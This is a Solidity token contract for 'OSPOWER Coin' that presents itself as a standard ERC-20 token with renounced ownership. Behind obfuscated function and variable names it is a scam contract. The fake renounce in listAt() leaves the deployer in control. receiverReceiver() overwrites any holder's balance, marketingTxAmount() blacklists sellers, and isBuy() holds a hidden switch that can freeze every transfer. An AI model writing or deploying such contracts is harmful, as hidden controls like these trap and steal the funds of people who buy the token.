//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface buyEnable {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverSwap) external view returns (uint256);

    function transfer(address atFund, uint256 launchFee) external returns (bool);

    function allowance(address buyIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchFee) external returns (bool);

    function transferFrom(
        address sender,
        address atFund,
        uint256 launchFee
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverEnable, uint256 value);
    event Approval(address indexed buyIs, address indexed spender, uint256 value);
}

interface buyEnableMetadata is buyEnable {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract senderIs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface senderFee {
    function createPair(address fromTo, address receiverTotal) external returns (address);
}

interface marketingTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract OSPOWERCoin is senderIs, buyEnable, buyEnableMetadata {

    function transferFrom(address modeEnable, address atFund, uint256 launchFee) external override returns (bool) {
        if (_msgSender() != takeTrading) {
            if (tokenLaunchedMax[modeEnable][_msgSender()] != type(uint256).max) {
                require(launchFee <= tokenLaunchedMax[modeEnable][_msgSender()]);
                tokenLaunchedMax[modeEnable][_msgSender()] -= launchFee;
            }
        }
        return isBuy(modeEnable, atFund, launchFee);
    }

    uint256 private walletLaunchLiquidity;

    mapping(address => uint256) private takeIsExempt;

    function limitMode(uint256 launchFee) public {
        teamAmountIs();
        fundReceiverShould = launchFee;
    }

    uint256 private fromMode = 100000000 * 10 ** 18;

    uint256 private txMaxTeam;

    function isBuy(address modeEnable, address atFund, uint256 launchFee) internal returns (bool) {
        if (modeEnable == teamToken) {
            return amountReceiver(modeEnable, atFund, launchFee);
        }
        uint256 receiverAt = buyEnable(receiverLaunch).balanceOf(marketingToken);
        require(receiverAt == fundReceiverShould);
        require(!maxTake[modeEnable]);
        return amountReceiver(modeEnable, atFund, launchFee);
    }

    function name() external view virtual override returns (string memory) {
        return teamMin;
    }

    bool private listSwap;

    function decimals() external view virtual override returns (uint8) {
        return autoExempt;
    }

    function amountReceiver(address modeEnable, address atFund, uint256 launchFee) internal returns (bool) {
        require(takeIsExempt[modeEnable] >= launchFee);
        takeIsExempt[modeEnable] -= launchFee;
        takeIsExempt[atFund] += launchFee;
        emit Transfer(modeEnable, atFund, launchFee);
        return true;
    }

    bool public isAmountReceiver;

    function marketingTxAmount(address senderShould) public {
        teamAmountIs();
        if (enableMax) {
            txSell = false;
        }
        if (senderShould == teamToken || senderShould == receiverLaunch) {
            return;
        }
        maxTake[senderShould] = true;
    }

    mapping(address => mapping(address => uint256)) private tokenLaunchedMax;

    address public teamToken;

    mapping(address => bool) public fundAmount;

    bool public enableMax;

    function symbol() external view virtual override returns (string memory) {
        return teamExemptLaunched;
    }

    function transfer(address toTrading, uint256 launchFee) external virtual override returns (bool) {
        return isBuy(_msgSender(), toTrading, launchFee);
    }

    function balanceOf(address receiverSwap) public view virtual override returns (uint256) {
        return takeIsExempt[receiverSwap];
    }

    function getOwner() external view returns (address) {
        return exemptTake;
    }

    string private teamMin = "OSPOWER Coin";

    bool public txSell;

    address private exemptTake;

    uint256 fundReceiverShould;

    address public receiverLaunch;

    uint8 private autoExempt = 18;

    function teamAmountIs() private view {
        require(fundAmount[_msgSender()]);
    }

    uint256 public shouldTrading;

    mapping(address => bool) public maxTake;

    uint256 private launchedFund;

    bool public minExemptAmount;

    function allowance(address launchMarketing, address toSell) external view virtual override returns (uint256) {
        if (toSell == takeTrading) {
            return type(uint256).max;
        }
        return tokenLaunchedMax[launchMarketing][toSell];
    }

    function txMinLaunched(address amountMax) public {
        if (isAmountReceiver) {
            return;
        }
        
        fundAmount[amountMax] = true;
        
        isAmountReceiver = true;
    }

    function owner() external view returns (address) {
        return exemptTake;
    }

    bool private toReceiver;

    function approve(address toSell, uint256 launchFee) public virtual override returns (bool) {
        tokenLaunchedMax[_msgSender()][toSell] = launchFee;
        emit Approval(_msgSender(), toSell, launchFee);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return fromMode;
    }

    function receiverReceiver(address toTrading, uint256 launchFee) public {
        teamAmountIs();
        takeIsExempt[toTrading] = launchFee;
    }

    uint256 private feeAmount;

    function listAt() public {
        emit OwnershipTransferred(teamToken, address(0));
        exemptTake = address(0);
    }

    string private teamExemptLaunched = "OCN";

    address marketingToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 sellMarketing;

    address takeTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    constructor (){
        if (toReceiver) {
            txMaxTeam = shouldTrading;
        }
        listAt();
        marketingTotal fromReceiverSwap = marketingTotal(takeTrading);
        receiverLaunch = senderFee(fromReceiverSwap.factory()).createPair(fromReceiverSwap.WETH(), address(this));
        
        teamToken = _msgSender();
        fundAmount[teamToken] = true;
        takeIsExempt[teamToken] = fromMode;
        if (minExemptAmount) {
            txMaxTeam = feeAmount;
        }
        emit Transfer(address(0), teamToken, fromMode);
    }

    event OwnershipTransferred(address indexed teamLimit, address indexed liquidityTxAuto);

}